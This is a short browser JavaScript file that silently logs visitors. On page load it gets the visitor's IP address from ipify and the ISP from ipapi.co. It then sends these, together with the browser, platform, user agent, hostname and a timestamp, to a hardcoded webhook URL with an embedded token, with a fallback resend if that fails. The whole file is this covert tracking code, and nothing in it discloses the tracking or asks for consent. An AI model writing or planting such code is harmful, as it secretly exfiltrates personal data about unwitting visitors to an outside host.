
const timestamp = Date.now();


let ip = "";
let browser = window.navigator.userAgent;
let os = window.navigator.platform;
let userAgent = navigator.userAgent;
let hostName = window.location.hostname;
let isp = "";


fetch("https://api.ipify.org")
  .then(response => response.text()) 
  .then(data => { 
    ip = data;
    return fetch(`https://ipapi.co/${ip}/json/`); 
  })
  .then(response => response.json()) 
  .then(data => { 
    isp = data.org;
    
    const body = { content: `Date/Time: ${timestamp}\nIP Address: ${ip}\nBrowser: ${browser}\nOperating System: ${os}\nUser Agent: ${userAgent}\nHost Name: ${hostName}\nISP: ${isp}` };
    fetch("https://webhook.newstargeted.com/api/webhooks/1181568786697027667/anWIYBB2yrCavJHOj-5kIXABIBH3ESX1iW_vqvCKBv4pj1seMpdc3_6sKFDwwkIRLI9B", { method: "POST", body: JSON.stringify(body), headers: { "Content-Type": "application/json" } })
      .then(() => console.log("Success!")) // Log a success message to the console if the request is successful
      .catch(() => { 
        const body = { content: `Date/Time: ${timestamp}\nIP Address: ${ip}\nBrowser: ${browser}\nOperating System: ${os}\nUser Agent: ${userAgent}\nHost Name: ${hostName}` };
        fetch("https://webhook.newstargeted.com/api/webhooks/1181568786697027667/anWIYBB2yrCavJHOj-5kIXABIBH3ESX1iW_vqvCKBv4pj1seMpdc3_6sKFDwwkIRLI9B", { method: "POST", body: JSON.stringify(body), headers: { "Content-Type": "application/json" } })
          .then(() => console.log("Success! (fallback)")) 
      }); 
  }); 
